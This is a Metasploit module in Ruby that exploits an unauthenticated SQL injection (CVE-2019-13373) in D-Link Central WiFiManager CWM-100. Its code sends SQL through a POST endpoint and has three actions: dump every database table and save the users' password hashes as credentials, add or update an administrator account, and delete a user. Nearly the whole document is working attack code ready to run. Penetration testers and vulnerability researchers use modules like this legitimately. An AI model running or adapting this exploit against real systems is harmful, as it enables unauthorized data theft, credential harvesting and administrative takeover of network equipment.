require 'csv'
require 'digest'
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'D-Link Central WiFiManager SQL injection',
        'Description' => %q{
          This module exploits a SQLi vulnerability found in
          D-Link Central WiFi Manager CWM(100) before v1.03R0100_BETA6. The
          vulnerability is an exposed API endpoint that allows the execution
          of SQL queries without authentication, using this vulnerability, it's
          possible to retrieve usernames and password hashes of registered users,
          device configuration, and other data, it's also possible to add users,
          or edit database informations.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'M3@ZionLab from DBAppSecurity',
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
          ],
        'References' => [
          ['CVE', '2019-13373'],
          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']
        ],
        'Actions' =>
          [
            [ 'SQLI_DUMP', 'Description' => 'Retrieve all the data from the database' ],
            [ 'ADD_ADMIN', 'Description' => 'Add an administrator user' ],
            [ 'REMOVE_ADMIN', 'Description' => 'Remove an administrator user' ]
          ],
        'DefaultOptions' => { 'SSL' => true },
        'DefaultAction' => 'SQLI_DUMP',
        'DisclosureDate' => 'Jul 06 2019'
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The base path to DLink CWM-100', '/']),
        OptString.new('Admin_Username', [false, 'The username of the user to add/remove']),
        OptString.new('Admin_Password', [false, 'The password of the user to add/edit'])
      ]
    )
  end

  def check
    @sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'Public', 'Conn.php'),
        'vars_post' => {
          'dbAction' => 'S',
          'dbSQL' => payload
        }
      )
      fail_with Failure::Unreachable, 'Failed to send HTTP request' unless res
      fail_with Failure::NotVulnerable, "Got #{res.code} response code" unless res.code == 200

      res.body[%r{<column>(.+)</column>}m, 1] || ''
    end

    @sqli.test_vulnerable ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def perform_sqli
    print_good "DBMS version: #{@sqli.version}"
    table_names = @sqli.enum_table_names
    print_status 'Enumerating tables'
    table_names.each do |table_name|
      cols = @sqli.enum_table_columns(table_name)
      vprint_good "#{table_name}(#{cols.join(',')})"
      # retrieve the data from the table
      content = @sqli.dump_table_fields(table_name, cols)
      # store hashes as credentials
      if table_name == 'usertable'
        user_ind = cols.index('username')
        pass_ind = cols.index('userpassword')
        content.each do |entry|
          create_credential(
            {
              module_fullname: fullname,
              workspace_id: myworkspace_id,
              username: entry[user_ind],
              private_data: entry[pass_ind],
              jtr_format: 'raw-md5',
              private_type: :nonreplayable_hash,
              status: Metasploit::Model::Login::Status::UNTRIED
            }.merge(service_details)
          )
          print_good "Saved credentials for #{entry[user_ind]}"
        end
      end
      path = store_loot(
        'dlink.http',
        'application/csv',
        rhost,
        cols.to_csv + content.map(&:to_csv).join,
        "#{table_name}.csv"
      )
      print_good "#{table_name} saved to #{path}"
    end
  end

  def add_user
    if datastore['Admin_Username'].nil?
      fail_with Failure::BadConfig, 'You must specify a username when adding a user'
    end
    admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'] || '')
    user_exists_sql = "select count(1) from usertable where username='#{datastore['Admin_Username']}'"
    # check if user exists, if yes, just change his password
    if @sqli.run_sql(user_exists_sql).to_i == 0
      print_status 'User not found on the target, inserting'
      @sqli.run_sql('insert into usertable(username,userpassword,level) values(' \
      "'#{datastore['Admin_Username']}', '#{admin_hash}', 1)")
    else
      print_status 'User already exists, updating the password'
      @sqli.run_sql("update usertable set userpassword='#{admin_hash}' where " \
      "username='#{datastore['Admin_Username']}'")
    end
  end

  def remove_user
    if datastore['Admin_Username'].nil?
      fail_with Failure::BadConfig, 'You must specify a username when adding a user'
    end
    @sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      print_error 'Target does not seem to be vulnerable'
      return
    end
    print_good 'Target seems vulnerable'
    case action.name
    when 'SQLI_DUMP' then perform_sqli
    when 'ADD_ADMIN' then add_user
    when 'REMOVE_ADMIN' then remove_user
    else
      fail_with(Failure::BadConfig, "#{action.name} not defined")
    end
  end
end
